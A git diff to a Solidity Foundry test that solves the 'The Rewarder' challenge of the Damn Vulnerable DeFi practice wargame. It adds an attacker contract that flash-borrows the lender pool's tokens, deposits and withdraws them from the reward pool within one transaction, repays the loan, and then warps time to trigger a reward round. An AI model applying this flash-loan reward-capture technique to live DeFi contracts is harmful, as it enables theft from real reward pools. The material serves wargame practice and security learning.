@@ -3,12 +3,49 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
-
+import "forge-std/console2.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+
+contract TheRewarderAttacker {
+    FlashLoanerPool public flashLoanerPool;
+    DamnValuableToken public dvt;
+    TheRewarderPool public theRewarderPool;
+    AccountingToken public accountingToken;
+    address public owner;
+
+    constructor(
+        FlashLoanerPool _flashLoanerPool,
+        DamnValuableToken _dvt,
+        TheRewarderPool _theRewarderPool,
+        AccountingToken _accountingToken
+    ) {
+        flashLoanerPool = _flashLoanerPool;
+        dvt = _dvt;
+        theRewarderPool = _theRewarderPool;
+        accountingToken = _accountingToken;
+        owner = msg.sender;
+    }
+
+    function attack() public {
+        uint256 max = dvt.balanceOf(address(flashLoanerPool)); // 1m ether of dvt
+        dvt.approve(address(theRewarderPool), max);
+        flashLoanerPool.flashLoan(max);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        console2.log("receive flash loan entered");
+        console2.log("amount is;", amount);
+        theRewarderPool.deposit(amount);
+        // accountingToken.approve(address(this), amount);
+        // accountingToken.approve(address(theRewarderPool), amount);
+        theRewarderPool.withdraw(amount);
+        dvt.transfer(address(flashLoanerPool), amount);
+    }
+}
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
@@ -88,7 +125,16 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        AccountingToken accToken = theRewarderPool.accToken();
+        TheRewarderAttacker attackerContract = new TheRewarderAttacker(flashLoanerPool, dvt, theRewarderPool, accToken);
+        attackerContract.attack();
 
+        vm.warp(block.timestamp + 5 days);
+        theRewarderPool.distributeRewards();
+        vm.stopPrank();
+
+        //CLUE IS THAT A ROUND HAS TAKEN PLACE WOT
         /**
          * EXPLOIT END *
          */
